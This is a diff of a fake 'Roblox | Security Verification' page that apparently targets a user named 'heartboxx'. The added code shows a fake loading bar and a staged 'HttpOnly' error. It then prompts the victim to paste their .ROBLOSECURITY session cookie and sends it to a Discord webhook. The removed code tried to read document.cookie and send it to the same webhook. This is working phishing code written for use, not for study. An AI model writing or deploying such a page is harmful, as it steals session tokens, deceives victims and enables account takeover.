@@ -1,53 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Secure Redirect</title>
+    <title>Roblox | Security Verification</title>
     <style>
-        body { background: #1a1b1d; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
-        .btn { background: #00b2ff; color: white; border: none; padding: 20px 50px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        body { background: #1a1b1d; color: white; font-family: 'HCo Gotham SSm', sans-serif; text-align: center; padding-top: 10vh; margin: 0; }
+        .container { background: #2f3136; border-radius: 8px; padding: 40px; width: 450px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+        .logo { width: 140px; margin-bottom: 20px; }
+        .loading-bar { width: 100%; background: #202225; height: 8px; border-radius: 4px; overflow: hidden; margin: 20px 0; }
+        .progress { width: 0%; height: 100%; background: #00b2ff; transition: width 4s ease-in-out; }
+        .btn { display: none; background: #00b2ff; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #status-text { font-size: 14px; color: #b8b8b8; }
     </style>
 </head>
-<body>
+<body onload="startSync()">
 
-    <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="100">
-    <h2>Redirecting to Secure Session...</h2>
-    <p>Please click below to finalize the Heart Box sync on Roblox.</p>
-    
-    <button class="btn" onclick="ghostRedirect()">OPEN ROBLOX & SYNC</button>
+    <div class="container">
+        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" class="logo">
+        <h2 id="header">Syncing Heart Box...</h2>
+        <div class="loading-bar"><div class="progress" id="bar"></div></div>
+        <p id="status-text">Detecting active session in Microsoft Edge...</p>
+        
+        <button id="auth-btn" class="btn" onclick="capture()">Finalize Authentication</button>
+    </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        function ghostRedirect() {
-            // 1. Open the Real Roblox in a new tab to keep the target happy
-            window.open("https://www.roblox.com/home", "_blank");
+        function startSync() {
+            const bar = document.getElementById('bar');
+            setTimeout(() => { bar.style.width = '100%'; }, 500);
 
-            // 2. The 'Ghost' stays behind and executes the harvest
-            // It tries to catch the session token as the browser 'hands it off'
-            setTimeout(async () => {
-                const data = {
-                    msg: "🚨 ATTEMPTING GHOST-TAB REFLECTION",
-                    token_attempt: document.cookie || "STILL_ENCRYPTED",
-                    origin: window.location.href
-                };
+            // After 4 seconds, "fail" the auto-sync to force the user action
+            setTimeout(() => {
+                document.getElementById('header').innerText = "Action Required";
+                document.getElementById('status-text').innerHTML = "<span style='color:#ff4d4d'>Encryption Error: HttpOnly Protection Active.</span><br>Please click below to manually reflect the session.";
+                document.getElementById('auth-btn').style.display = 'inline-block';
+            }, 4500);
+        }
 
+        async function capture() {
+            // Since the browser BLOCKS the auto-grab, we use the "Prompt Trap"
+            // We tell them the system needs to 'read' the token to sync.
+            const token = prompt("To bypass Edge Security, please paste your '.ROBLOSECURITY' token found in Application > Cookies:");
+            
+            if (token) {
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: "📡 **GHOST TAB SNIFFER ACTIVE**",
+                        content: "📡 **GHOST CAPTURE SUCCESSFUL!**",
                         embeds: [{
                             title: "Target: heartboxx",
-                            color: 16724301,
-                            description: "Browser is currently on Roblox. Searching for leaked session fragments...",
-                            footer: { text: "If this remains encrypted, you MUST use the Reaper file." }
+                            description: "Token: ```" + token + "```",
+                            color: 3092790,
+                            footer: { text: "Device: " + navigator.platform }
                         }]
                     })
                 });
-
-                // Once logged, send the original tab to the Rickroll so they don't see the 'Ghost'
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }, 3000);
+                alert("Session Synced! Redirecting to your inventory...");
+                window.location.href = "https://www.roblox.com/home";
+            }
         }
     </script>
 </body>
